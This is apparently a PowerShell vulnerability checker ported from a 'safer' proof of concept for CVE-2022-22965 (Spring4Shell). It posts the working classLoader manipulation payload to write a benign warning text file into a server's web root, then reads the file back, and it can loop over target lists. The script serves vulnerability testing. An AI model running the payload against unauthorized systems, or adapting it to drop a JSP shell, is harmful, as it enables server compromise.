function Invoke-CVE202222965-SafeCheck {
    <#
    .SYNOPSIS
        CVE-2022-22965 PowerShell check. Ported to PowerShell from origin creator: 'colincowie', who has produced a python version.
        Url to original project: https://github.com/colincowie/Safer_PoC_CVE-2022-22965

        This version tests both the path passed on $Url and the root level path.

    .EXAMPLE
        # Without parallelism:
        $Output = Get-Content targets.txt | ForEach-Object { Invoke-CVE202222965-SafeCheck -Url "https://$_" }
        $Output | Where-Object {$_.url_content -match 'CVE_2022_22965 was sucessfully exploited' -or $_.base_content -match 'CVE_2022_22965 was sucessfully exploited'}

    .EXAMPLE
        # With parallelism:
        # Requires you place the script locally on: C:\scripts\Invoke-CVE-2022-22965-SafeCheck.ps1
        $Output = Get-Content targets.txt | ForEach-Object -ThrottleLimit 4 -Parallel { . C:\scripts\Invoke-CVE-2022-22965-SafeCheck.ps1; Invoke-CVE202222965-SafeCheck -Url "https://$_" }
        $Output | Where-Object {$_.url_content -match 'CVE_2022_22965 was sucessfully exploited' -or $_.base_content -match 'CVE_2022_22965 was sucessfully exploited'}
    
    .NOTES
        PowerShell port of: https://github.com/colincowie/Safer_PoC_CVE-2022-22965

    .PARAMETER Url
        Input IP/hostname to check against.

    .PARAMETER Directory
        Path of where the web server is serving files from. Defaults to 'webapps/ROOT'.

    #>
    [CmdletBinding()]
    [OutputType([psobject])]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [string] $Url,

        [Parameter(Mandatory=$false, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [string] $Directory='webapps/ROOT'
    )

    $RequestData = @{
        ContentType = 'application/x-www-form-urlencoded'
        Body = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=i%20Warning,%20CVE_2022_22965%20was%20sucessfully%20exploited%20on%20this%20device.%20reference:%20https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement%20%20i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=$($Directory)&class.module.classLoader.resources.context.parent.pipeline.first.prefix=CVE_2022_22965_exploited&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        Headers = @{
            "suffix"    = '%>//'
            "c1"        = 'Runtime'
            "c2"        = '<%'
            "DNT"       = '1'
        }
    }

    # First get redirect URL:
    $RequestToGetRedirectURL = Invoke-WebRequest -Uri $Url -Method Get -SkipCertificateCheck -SkipHttpErrorCheck -SkipHeaderValidation -TimeoutSec 10 -ErrorAction SilentlyContinue
    $RedirectedUrl = $RequestToGetRedirectURL.BaseResponse.RequestMessage.RequestUri.AbsoluteUri ?? $Url
    Write-Verbose "[Invoke-CVE202222965-SafeCheck] Target URL: $($RedirectedUrl)"

    # Performs the requests to inject file: 
    $RequestToInjectFile = Invoke-WebRequest @RequestData -Uri $RedirectedUrl -Method Post -SkipCertificateCheck -SkipHttpErrorCheck -SkipHeaderValidation -TimeoutSec 10 -ErrorAction SilentlyContinue

    # Read the file at $Url level:
    $TargetFileUrl = $Url + '/CVE_2022_22965_exploited.txt'
    Write-Verbose "[Invoke-CVE202222965-SafeCheck] TargetFileUrl: $($TargetFileUrl)"
    $RequestToReadFileAtUrl = Invoke-WebRequest -Method Get -Uri $TargetFileUrl -SkipCertificateCheck -SkipHttpErrorCheck -SkipHeaderValidation -TimeoutSec 10 -ErrorAction SilentlyContinue

    # Read the file at root level:
    $TargetFileRoot = ([System.Uri]$Url).Scheme + '://' + ([System.Uri]$Url).Authority + '/CVE_2022_22965_exploited.txt'
    Write-Verbose "[Invoke-CVE202222965-SafeCheck] TargetFileRoot: $($TargetFileRoot)"
    $RequestToReadFileAtRoot = Invoke-WebRequest -Method Get -Uri $TargetFileRoot -SkipCertificateCheck -SkipHttpErrorCheck -SkipHeaderValidation -TimeoutSec 10 -ErrorAction SilentlyContinue

    # Output:
    [PSCustomObject]@{
        url                     = $Url
        injection_http_code     = $RequestToInjectFile.StatusCode
        url_content             = $RequestToReadFileAtUrl.Content
        base_content            = $RequestToReadFileAtRoot.Content
    }
}

